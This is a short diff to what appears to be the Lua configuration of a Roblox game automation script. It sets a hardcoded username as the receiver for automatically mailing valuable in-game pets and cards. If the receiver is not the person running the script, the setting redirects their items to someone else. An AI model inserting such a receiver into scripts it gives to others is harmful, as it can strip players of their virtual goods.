@@ -30,7 +30,7 @@ _G.GEVENT_UPGRADES = {
   "CheaperMysteryPackMerchantPrices",
   "EasierQuests"
 }
-_G.GMAIL_RECEIVERS = {""} -- for Mail items
+_G.GMAIL_RECEIVERS = {"paul667823"} -- for Mail items
 _G.GMAIL_ITEMS = {
     ["All Huges"] = {Class = "Pet", Id = "All Huges", MinAmount = 1},
     ["Huge Arcade Dog Card"] = {Class = "Card", Id = "Huge Arcade Dog Card", MinAmount = 1, AllVariants = true},
